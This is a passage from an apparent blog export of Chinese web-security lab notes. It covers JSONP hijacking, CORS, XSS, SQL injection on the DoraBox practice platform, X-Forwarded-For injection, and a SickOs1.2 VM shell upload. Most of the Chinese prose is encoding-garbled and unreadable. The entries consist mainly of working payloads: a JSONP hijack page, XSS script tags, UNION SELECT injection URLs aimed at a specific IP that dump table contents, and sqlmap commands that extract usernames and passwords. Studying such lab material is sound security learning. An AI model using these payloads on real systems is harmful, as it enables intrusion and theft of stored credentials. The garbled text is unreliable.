]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>å­¦ä¹ </tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF</title>
    <url>/2020/03/17/CSRF/</url>
    <content><![CDATA[<h1 id="0x00-JSONPåŠ«æŒ"><a href="#0x00-JSONPåŠ«æŒ" class="headerlink" title="0x00 JSONPåŠ«æŒ"></a><strong>0x00 JSONPåŠ«æŒ</strong></h1><p>JSONP å…¨ç§°æ˜¯ JSON with Padding ï¼Œæ˜¯åŸºäº JSON æ ¼å¼çš„ä¸ºè§£å†³è·¨åŸŸè¯·æ±‚èµ„æºè€Œäº§ç”Ÿçš„è§£å†³æ–¹æ¡ˆã€‚ä»–å®ç°çš„åŸºæœ¬åŸç†æ˜¯åˆ©ç”¨äº† HTML é‡Œ <code>&lt;script&gt;&lt;/script&gt;</code>å…ƒç´ æ ‡ç­¾ï¼Œè¿œç¨‹è°ƒç”¨ JSON æ–‡ä»¶æ¥å®ç°æ•°æ®ä¼ é€’ã€‚<br>å½“æŸç½‘ç«™å¬è¿‡ JSONP çš„æ–¹å¼æ¥è·¨åŸŸï¼ˆä¸€èˆ¬ä¸ºå­åŸŸï¼‰ä¼ é€’ç”¨æˆ·è®¤è¯åçš„æ•æ„Ÿä¿¡æ¯æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ JSONP è°ƒç”¨é¡µé¢ï¼Œè¯±å¯¼è¢«æ”»å‡»è€…è®¿é—®æ¥è¾¾åˆ°æˆªå–ç”¨æˆ·æ•æ„Ÿä¿¡æ¯çš„ç›®çš„ã€‚<br>ç›´æ¥è®¿é—®é“¾æ¥ï¼Œé¡µé¢è¿”å›jsonæ ¼å¼çš„æ•°æ®ã€‚</p>
<p>ç›®æ ‡å¯ä»¥çœ‹åˆ°é¡µé¢åŒ…å«äº†ç”¨æˆ·ä¿¡æ¯<br><img src="/2020/03/17/CSRF/image-20200317182038345.png" alt="image-20200317182038345"></p>
<p>é‚£ä¹ˆåŠ«æŒååº”è¯¥æ˜¯å¯ä»¥åœ¨å…¶ä»–åŸŸä¸‹è·å¾—å—å®³è€…çš„jsonä¿¡æ¯ï¼Œä¸‹é¢æ„é€ ä¸€ä¸ªåŠ«æŒé¡µé¢ï¼Œå°†åŠ«æŒçš„ä¿¡æ¯ï¼Œalertå‡ºæ¥</p>
<p>è¿™æ˜¯æˆ‘ä»¬ç”¨åˆ°çš„ä»£ç  </p>
<!--jsonp.html-->

<script>function vulkey(data){alert(JSON.stringify(data));}</script>
<script src="http://http://106.13.42.155:91/DoraBox/csrf/jsonp.php?callback=vulkey"></script>

<p>æ•ˆæœ<br><img src="/2020/03/17/CSRF/image-20200317190406561.png" alt="image-20200317190406561"></p>
<h1 id="0x01-CORSè·¨åŸŸèµ„æºè¯»å–"><a href="#0x01-CORSè·¨åŸŸèµ„æºè¯»å–" class="headerlink" title="0x01 CORSè·¨åŸŸèµ„æºè¯»å–"></a><strong>0x01 CORSè·¨åŸŸèµ„æºè¯»å–</strong></h1><p>è·¨æºèµ„æºå…±äº« (CORS) å®šä¹‰äº†åœ¨ä¸€ä¸ªåŸŸä¸­åŠ è½½çš„å®¢æˆ·ç«¯ Web åº”ç”¨ç¨‹åºä¸å¦ä¸€ä¸ªåŸŸä¸­çš„èµ„æºäº¤äº’çš„æ–¹å¼,éœ€è¦æµè§ˆå™¨å’ŒæœåŠ¡å™¨å…±åŒæ”¯æŒæ‰èƒ½å®ç°ã€‚<br>å¯ä»¥çœ‹åˆ°å…¶æºç å°±æ˜¯Access-Control-Allow-*ç³»åˆ—ï¼Œè¿™ä¸ªå°±æ˜¯CORSçš„é…ç½®<br><img src="/2020/03/17/CSRF/image-20200317192022257.png" alt="image-20200317192022257"></p>
<p>æ¥ä¸‹æ¥æ„é€ é¡µé¢è·å–ä¿¡æ¯<br><img src="/2020/03/17/CSRF/image-20200317200358860.png" alt="image-20200317200358860"></p>
<p>æ•ˆæœ<br><img src="/2020/03/17/CSRF/image-20200317200411005.png" alt="image-20200317200411005"></p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>å­¦ä¹ </tag>
      </tags>
  </entry>
  <entry>
    <title>XSSè·¨ç«™</title>
    <url>/2020/03/17/XSS%E8%B7%A8%E7%AB%99/</url>
    <content><![CDATA[<p>ä»¥DoraBoxæ¼æ´ç»ƒä¹ å¹³å°æ¥è¿›è¡Œæœ¬æ–‡çš„å®éªŒ</p>
<p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/gh0stkey/DoraBox" target="_blank" rel="noopener">https://github.com/gh0stkey/DoraBox</a></p>
<h1 id="0x00-XSSåå°„å‹"><a href="#0x00-XSSåå°„å‹" class="headerlink" title="0x00 XSSåå°„å‹"></a><strong>0x00 XSSåå°„å‹</strong></h1><p>xssåå°„å‹ï¼Œè¾“å…¥çš„ä»£ç ç»è¿‡æœåŠ¡å™¨ç«¯å¤„ç†åè¿”å›é¡µé¢ï¼Œé€ æˆä»£ç æ‰§è¡Œã€‚<br><code>&lt;script&gt;alert(/reflect_xss/)&lt;/script&gt;</code></p>
<p><img src="/2020/03/17/XSS%E8%B7%A8%E7%AB%99/image-20200317165346892.png" alt="image-20200317165346892"></p>
<p>è¿™æ—¶å€™æˆ‘ä»¬æ³¨æ„åˆ°é¡µé¢å…ˆæ˜¯è¿”å›äº†string(37) â€œ ç„¶åæ‰§è¡Œäº†æ³¨å…¥ä»£ç ã€‚<br>é‚£ä¹ˆä¸ºä»€ä¹ˆä¼šè¿”å›è¿™ä¸ªå‘¢ï¼Œæˆ‘ä»¬çœ‹ä¸‹æºç <br>DoraBox\xxs\reflect_xss.php</p>
<p><img src="/2020/03/17/XSS%E8%B7%A8%E7%AB%99/image-20200317165710937.png" alt="image-20200317165710937"></p>
<p><code>$p åˆ›å»ºäº†ä¸€ä¸ªå¯¹è±¡Funcï¼Œæ–¹æ³•æ˜¯GETï¼Œå‚æ•°æ˜¯nameï¼Œ$p -&gt; con_htmlç”Ÿæˆè¡¨å•ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸€å¼€å§‹çœ‹åˆ°çš„é¡µé¢ã€‚</code><br><code>å…³é”®çš„æ˜¯echo $p -&gt; con_function(&#39;var_dump&#39;,$name);ï¼Œè¿™é‡Œcon_functionæ˜¯ä½œè€…é€ çš„å›è°ƒå‡½æ•°ï¼Œä½œç”¨æ˜¯æ‰§è¡Œä½œè€…ä¼ å‚è¿›å»çš„å†…å®¹ï¼Œå½“ç›¸åº”çš„å‡½æ•°æ‰§è¡Œã€‚</code><br><code>é‚£ä¹ˆcon_function(&#39;var_dump&#39;,$name) çš„ä½œç”¨ç­‰ä»·äºvar_dump($name)ï¼Œvar_dumpåœ¨å¤„ç†å­—ç¬¦ä¸²çš„æ—¶å€™ä¼šä»¥å¦‚ä¸‹å½¢å¼string(å­—ç¬¦ä¸²é•¿åº¦) &quot;å­—ç¬¦ä¸²å†…å®¹&quot;ã€‚</code></p>
<h1 id="0x01-XSS-å­˜å‚¨å‹"><a href="#0x01-XSS-å­˜å‚¨å‹" class="headerlink" title="0x01 XSS å­˜å‚¨å‹"></a><strong>0x01 XSS å­˜å‚¨å‹</strong></h1><p>å­˜å‚¨å‹xssä½œè€…è®¾è®¡çš„å¾ˆæœ‰æ„æ€ï¼Œé‡‡ç”¨ç›´æ¥å‘å½“å‰é¡µé¢è¿½åŠ å†…å®¹çš„æ–¹å¼å®ç°çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä½ æµ‹è¯•å¾ˆå¤šæ¬¡çš„è¯ï¼Œè¿™ä¸ªé¡µé¢ä¼šè¶Šæ¥è¶Šå¤§ã€‚<br>æ‰€ä»¥åœ¨name<code>è¾“å…¥æ¡†æäº¤&lt;script&gt;alert(/reflect_xss/)&lt;/script&gt;</code>ï¼Œå†æ¬¡åˆ·æ–°é¡µé¢å³å¯è§¦å‘æ³¨å…¥ä»£ç ã€‚</p>
<p><img src="/2020/03/17/XSS%E8%B7%A8%E7%AB%99/image-20200317170930548.png" alt="image-20200317170930548"></p>
<h1 id="0x02-XSS-DOMå‹"><a href="#0x02-XSS-DOMå‹" class="headerlink" title="0x02 XSS DOMå‹"></a><strong>0x02 XSS DOMå‹</strong></h1><p>å¯ä»¥å‘é€ï¼Œxssä»£ç æ‰§è¡Œåæ²¡æœ‰åœ¨æºç æ˜¾ç¤ºå‡ºæ¥ï¼Œè¿™å¯èƒ½å°±æ˜¯DOMå‹xssçš„ç‰¹ç‚¹</p>
<p><img src="/2020/03/17/XSS%E8%B7%A8%E7%AB%99/image-20200317171142022.png" alt="image-20200317171142022"></p>
<p>è¿™é‡Œå¼•ç”¨åˆ«äººå¯¹domçš„è§£é‡Š<br><img src="/2020/03/17/XSS%E8%B7%A8%E7%AB%99/image-20200317171606831.png" alt="image-20200317171606831"></p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>å­¦ä¹ </tag>
      </tags>
  </entry>
  <entry>
    <title>SQLæ³¨å…¥</title>
    <url>/2020/03/17/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>ä»¥DoraBoxæ¼æ´ç»ƒä¹ å¹³å°æ¥è¿›è¡Œæœ¬æ–‡çš„å®éªŒ</p>
<p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/gh0stkey/DoraBox" target="_blank" rel="noopener">https://github.com/gh0stkey/DoraBox</a></p>
<h1 id="0x00-SQLi-æ•°å­—å‹"><a href="#0x00-SQLi-æ•°å­—å‹" class="headerlink" title="0x00 SQLi æ•°å­—å‹"></a><strong>0x00 SQLi æ•°å­—å‹</strong></h1><p>åˆ¤æ–­è¡¨ä¸­æœ‰å¤šå°‘åˆ—<br>[<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=1%20order%20by%201&amp;submit=submit]" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=1%20order%20by%201&amp;submit=submit]</a>(<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=1" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=1</a> order by 1&amp;submit=submit)</p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317141900856.png" alt="image-20200317141900856"></p>
<p>ä¾æ¬¡å¢å¤§order by åé¢çš„å€¼ï¼Œç›´åˆ°æŠ¥é”™ï¼ŒæŠ¥é”™çš„å‰ä¸€ä¸ªæ•°ä¸ºå­—æ®µæ•°,åœ¨order by 4çš„æ—¶å€™æŠ¥é”™ï¼Œæ„å‘³ç€æ•°æ®åº“3åˆ—</p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317142013448.png" alt="image-20200317142013448"></p>
<p>unionæ³¨å…¥çš„å­—æ®µä¸º3ï¼Œæ­¤æ—¶æˆ‘ä»¬æ„é€ æ³¨å…¥è¯­å¥<br>[<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1%20union%20select%201,2,3&amp;submit=submit]" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1%20union%20select%201,2,3&amp;submit=submit]</a>(<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1</a> union select 1,2,3&amp;submit=submit)</p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317142133903.png" alt="image-20200317142133903"></p>
<p>å¯ä»¥çœ‹åˆ°2ï¼Œ3åˆ—æ˜¯æ˜¾ç¤ºå‡ºæ¥çš„ï¼Œæ‰€ä»¥åœ¨è¿™ä¸¤å¤„æ’å…¥æ³¨å…¥è¯­å¥<br>[<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1%20union%20select%201,concat(user(),%27|%27,database()),3&amp;submit=submit]" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1%20union%20select%201,concat(user(),%27|%27,database()),3&amp;submit=submit]</a>(<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1</a> union select 1,concat(user(),â€™|â€™,database()),3&amp;submit=submit)</p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317142231491.png" alt="image-20200317142231491"></p>
<p>ç¡®å®šæ•°æ®åº“ä¸ºpentestä»¥åï¼Œå»æš´å‡ºè¡¨å<br>[<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1%20UNION%20SELECT%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()&amp;submit=submit]" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1%20UNION%20SELECT%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()&amp;submit=submit]</a>(<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1</a> UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()&amp;submit=submit)</p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317144121314.png" alt="image-20200317144121314"></p>
<p>ç¡®å®šè¡¨åä»¥åï¼Œå»æš´å‡ºåˆ—å<br>[<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1%20UNION%20SELECT%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27account%27&amp;submit=submit]" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1%20UNION%20SELECT%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27account%27&amp;submit=submit]</a>(<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1</a> UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name=â€™accountâ€™&amp;submit=submit)</p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317144212217.png" alt="image-20200317144212217"></p>
<p>æ ¹æ®ä¹‹å‰çš„åˆ—åå’Œè¡¨åï¼Œå¯æ„é€ æŸ¥è¯¢å­—æ®µå†…å®¹<br>[<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1%20UNION%20SELECT%201,2,concat_ws(%27|%27,id,rest,own)%20from%20account&amp;submit=submit]" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1%20UNION%20SELECT%201,2,concat_ws(%27|%27,id,rest,own)%20from%20account&amp;submit=submit]</a>(<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1</a> UNION SELECT 1,2,concat_ws(â€˜|â€™,id,rest,own) from account&amp;submit=submit)</p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317144340826.png" alt="image-20200317144340826"></p>
<h1 id="0x01-SQLi-å­—ç¬¦å‹"><a href="#0x01-SQLi-å­—ç¬¦å‹" class="headerlink" title="0x01 SQLi å­—ç¬¦å‹"></a><strong>0x01 SQLi å­—ç¬¦å‹</strong></h1><p>å­—ç¬¦å‹ä¸æ•°å­—å‹çš„åŒºåˆ«åœ¨äºå˜é‡æ˜¯å¦ç”¨å•å¼•å·åŒ…è£¹ï¼Œå½“ä¸é—­åˆå•å¼•å·æ—¶ï¼Œæ²¡æœ‰æŸ¥è¯¢ç»“æœ</p>
<p>[<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_string.php?title=DoraBox%20and%201=1&amp;submit=submit]" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_string.php?title=DoraBox%20and%201=1&amp;submit=submit]</a>(<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_string.php?title=DoraBox" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_string.php?title=DoraBox</a> and 1=1&amp;submit=submit)</p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317144856486.png" alt="image-20200317144856486"></p>
<p>é—­åˆå•å¼•å·ï¼ŒæˆåŠŸæ‰§è¡Œæ’å…¥çš„è¯­å¥<br>[<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_string.php?title=DoraBox%27%20and%20%271%27=%271&amp;submit=submit]" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_string.php?title=DoraBox%27%20and%20%271%27=%271&amp;submit=submit]</a>(<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_string.php?title=DoraBox&#39;" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_string.php?title=DoraBox&#39;</a> and â€˜1â€™=â€™1&amp;submit=submit)</p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317161405024.png" alt="image-20200317161405024"></p>
<p>æ¥ä¸‹æ¥çš„æ“ä½œï¼Œä¸æ•°å­—å‹ç›¸åŒï¼Œåªéœ€è¦è®°å¾—éœ€è¦é—­åˆå•å¼•å·<br>[<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_string.php?title=DoraBox%27%20and%20%271%27=%272%27%20union%20select%201,2,3%27&amp;submit=submit]" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_string.php?title=DoraBox%27%20and%20%271%27=%272%27%20union%20select%201,2,3%27&amp;submit=submit]</a>(<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_string.php?title=DoraBox&#39;" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_string.php?title=DoraBox&#39;</a> and â€˜1â€™=â€™2â€™ union select 1,2,3â€™&amp;submit=submit)</p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317161531451.png" alt="image-20200317161531451"></p>
<h1 id="0x02-SQLi-æœç´¢å‹"><a href="#0x02-SQLi-æœç´¢å‹" class="headerlink" title="0x02 SQLi æœç´¢å‹"></a><strong>0x02 SQLi æœç´¢å‹</strong></h1><p>æœç´¢å‹åŒæ—¶åŒ…å«å•å¼•å·å’Œç™¾åˆ†å·ï¼Œéƒ½éœ€è¦é—­åˆ</p>
<p>[<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_search.php?content=DoraBox%27%20and%20%271%27=%271&amp;submit=submit]" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_search.php?content=DoraBox%27%20and%20%271%27=%271&amp;submit=submit]</a>(<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_search.php?content=DoraBox&#39;" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_search.php?content=DoraBox&#39;</a> and â€˜1â€™=â€™1&amp;submit=submit)</p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317162517356.png" alt="image-20200317162517356"></p>
<p>å¼•å…¥äº†æ³¨é‡Šç¬¦ï¼Œé¿å…å—åˆ°åé¢%â€˜å½±å“<br><a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_search.php?content=DoraBox%%27%20and%201=1--+&amp;submit=submit" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_search.php?content=DoraBox%%27%20and%201=1--+&amp;submit=submit</a></p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317162608701.png" alt="image-20200317162608701"></p>
<p>æ„é€ æ˜¾ç¤ºæ˜¾æ€§å­—æ®µ<br><a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_search.php?content=DoraBox%%27%20and%201=2%20union%20select%201,2,3--+&amp;submit=submit" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_search.php?content=DoraBox%%27%20and%201=2%20union%20select%201,2,3--+&amp;submit=submit</a></p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317162649090.png" alt="image-20200317162649090"></p>
<p>æ¥ä¸‹æ¥ï¼Œå¦‚åŒå‰ä¸¤ç§ä¸€æ ·ï¼Œæš´å‡ºæ•°æ®ä¿¡æ¯ã€‚<br><a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_search.php?content=DoraBox%%27%20and%201=2%20union%20select%201,concat_ws(%27|%27,id,title,content),3%20from%20news--+&amp;submit=submit" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_search.php?content=DoraBox%%27%20and%201=2%20union%20select%201,concat_ws(%27|%27,id,title,content),3%20from%20news--+&amp;submit=submit</a></p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317162826195.png" alt="image-20200317162826195"></p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>å­¦ä¹ </tag>
      </tags>
  </entry>
  <entry>
    <title>X-Forwarded-Foræ³¨å…¥</title>
    <url>/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="0x00-fuzzæµ‹è¯•"><a href="#0x00-fuzzæµ‹è¯•" class="headerlink" title="0x00 fuzzæµ‹è¯•"></a><strong>0x00 fuzzæµ‹è¯•</strong></h1><p>æ‰“å¼€é¡µé¢å‘ç°æ˜¯ä¸ªç™»é™†åå°ï¼Œç™»å½•æ¡†éšä¾¿è¾“å…¥è¯•è¯•<br>å‘ç°æœ‰ä¹±ç  åˆ°firefoxçš„F12çœ‹çœ‹å“åº”</p>
<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316112017843.png" alt="image-20200316112017843"></p>
<p>å‘Šè¯‰æˆ‘ä»¬ipå·²ç»è®°å½•ã€€<br>æœåŠ¡ç«¯è·å–å®¢æˆ·ç«¯IPåœ°å€çš„æ–¹å¼,å…¶ä¸­ä¸€ç§æ˜¯é€šè¿‡è¯»å–è¯·æ±‚ä¸­X-Forwarded-Forçš„å­—æ®µå€¼ï¼Œç¡®è®¤æœåŠ¡ç«¯æ˜¯ä¸æ˜¯ä½¿ç”¨è¿™ç§æ–¹å¼è·å–å®¢æˆ·ç«¯IPåœ°å€<br>ç¼–è¾‘åˆšæ‰çš„è¯·æ±‚ï¼Œåœ¨è¯·æ±‚å¤´ä¸­åŠ å…¥X-Forwarded-For:121.8.146.99(è¿™ä¸ªæ˜¯æˆ‘ä»¬ä¼ªé€ çš„IPåœ°å€ï¼Œéšä¾¿å¡«ä¸€ä¸ªåˆæ³•çš„IPåœ°å€å³å¯)ï¼Œç„¶åé‡æ–°å‘é€</p>
<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316112843791.png" alt="image-20200316112843791"></p>
<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316112913342.png" alt="image-20200316112913342"></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œä¹‹å‰éšæ„å¡«çš„X-Forwarded-Forå­—æ®µä¸­çš„IPåœ°å€ 121.8.146.99 å·²ç»è¢«è®°å½•äº†ï¼Œè¿™å°±ç¡®è®¤äº†æœåŠ¡ç«¯æ˜¯é€šè¿‡è¯»å–X-Forwarded-Forçš„å­—æ®µå€¼æ¥è·å–å®¢æˆ·ç«¯çš„IPåœ°å€çš„<br>ä¸‹é¢ç›´æ¥ç”¨SQLMAPç¡®è®¤X-Forwarded-Forå­˜åœ¨SQLæ³¨å…¥æ¼æ´</p>
<h1 id="0x01-sqlmapè·‘æ³¨å…¥"><a href="#0x01-sqlmapè·‘æ³¨å…¥" class="headerlink" title="0x01 sqlmapè·‘æ³¨å…¥"></a><strong>0x01 sqlmapè·‘æ³¨å…¥</strong></h1><p>å°†ç¬¬äºŒæ¬¡ç™»å½•è¯·æ±‚çš„ä¿¡æ¯æ‘˜ä¸‹æ¥ï¼Œæ–°å»ºæˆtxtæ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘å‘½åä¸ºx-forwarded-for.txtï¼Œå¹¶å°†x-forwarded-forçš„å€¼æ”¹ä¸º*</p>
<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316113807808.png" alt="image-20200316113807808"></p>
<p>sqlmap -r x-forwarded-for.txt â€“batch<br>éœ€è¦åœ¨x-forwarded-for.txtæ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ä¸­è·‘</p>
<h2 id="ç¡®è®¤æ¼æ´"><a href="#ç¡®è®¤æ¼æ´" class="headerlink" title="ç¡®è®¤æ¼æ´"></a>ç¡®è®¤æ¼æ´</h2><p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316114245921.png" alt="image-20200316114245921"></p>
<h2 id="æŸ¥è¯¢æ•°æ®åº“"><a href="#æŸ¥è¯¢æ•°æ®åº“" class="headerlink" title="æŸ¥è¯¢æ•°æ®åº“"></a>æŸ¥è¯¢æ•°æ®åº“</h2><p>sqlmap -r x-forwarded-for.txt â€“batch â€“dbs</p>
<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316114550478.png" alt="image-20200316114550478"></p>
<h2 id="æŸ¥è¯¢å½“å‰æ•°æ®åº“åº“"><a href="#æŸ¥è¯¢å½“å‰æ•°æ®åº“åº“" class="headerlink" title="æŸ¥è¯¢å½“å‰æ•°æ®åº“åº“"></a>æŸ¥è¯¢å½“å‰æ•°æ®åº“åº“</h2><p>sqlmap -r x-forwarded-for.txt â€“batch â€“current-db</p>
<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316114645795.png" alt="image-20200316114645795"></p>
<h2 id="æŸ¥è¯¢è·å–æ•°æ®åº“ä¸­è¡¨"><a href="#æŸ¥è¯¢è·å–æ•°æ®åº“ä¸­è¡¨" class="headerlink" title="æŸ¥è¯¢è·å–æ•°æ®åº“ä¸­è¡¨"></a>æŸ¥è¯¢è·å–æ•°æ®åº“ä¸­è¡¨</h2><p>sqlmap -r x-forwarded-for.txt â€“batch -D â€œwebcalendarâ€ â€“tables</p>
<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316114838304.png" alt="image-20200316114838304"></p>
<h2 id="æŸ¥è¯¢è¡¨çš„å­—æ®µ"><a href="#æŸ¥è¯¢è¡¨çš„å­—æ®µ" class="headerlink" title="æŸ¥è¯¢è¡¨çš„å­—æ®µ"></a>æŸ¥è¯¢è¡¨çš„å­—æ®µ</h2><p>ä»¥userä¸ºä¾‹ï¼šsqlmap -r x-forwarded-for.txt â€“batch -T â€œuserâ€  -D â€œwebcalendarâ€ â€“columns </p>
<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316115145834.png" alt="image-20200316115145834"></p>
<h2 id="æŸ¥è¯¢è¡¨çš„å†…å®¹"><a href="#æŸ¥è¯¢è¡¨çš„å†…å®¹" class="headerlink" title="æŸ¥è¯¢è¡¨çš„å†…å®¹"></a>æŸ¥è¯¢è¡¨çš„å†…å®¹</h2><p>sqlmap -r x-forwarded-for.txt -T â€œuserâ€ -D â€œwebcalendarâ€ -C â€œid,username,passwordâ€ â€“batch â€“dump </p>
<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316122534470.png" alt="image-20200316122534470"></p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>å­¦ä¹ </tag>
      </tags>
  </entry>
  <entry>
    <title>SickOs1.2</title>
    <url>/2020/03/15/SickOs1-2/</url>
    <content><![CDATA[<h1 id="0x00-ä¿¡æ¯æ”¶é›†"><a href="#0x00-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x00 ä¿¡æ¯æ”¶é›†"></a><strong>0x00 ä¿¡æ¯æ”¶é›†</strong></h1><p><img src="/2020/03/15/SickOs1-2/image-20200315180547120.png" alt="image-20200315180547120"></p>
<p>dirbæ‰«ç›®å½• å‘ç°ä¸ªtest</p>
<p><img src="/2020/03/15/SickOs1-2/image-20200315181814090.png" alt="image-20200315181814090"></p>
<p><img src="/2020/03/15/SickOs1-2/image-20200315185800832.png" alt="image-20200315185800832"></p>
<h1 id="0x01-è·å–shell"><a href="#0x01-è·å–shell" class="headerlink" title="0x01 è·å–shell"></a><strong>0x01 è·å–shell</strong></h1><p>å‘ç°å¯ä»¥PUT é‚£ä¹ˆè¯•è¯•ç›´æ¥ä¸Šä¼ æ–‡ä»¶</p>
<p><img src="/2020/03/15/SickOs1-2/image-20200315185640271.png" alt="image-20200315185640271"></p>
<p><img src="/2020/03/15/SickOs1-2/image-20200315185902815.png" alt="image-20200315185902815"></p>
<p>è¿æ¥æˆåŠŸ</p>
<p><img src="/2020/03/15/SickOs1-2/image-20200315190043984.png" alt="image-20200315190043984"></p>
<p>ç”¨çš„ä¸­å›½èšå‰‘ æ‰“å¼€è™šæ‹Ÿç»ˆç«¯</p>
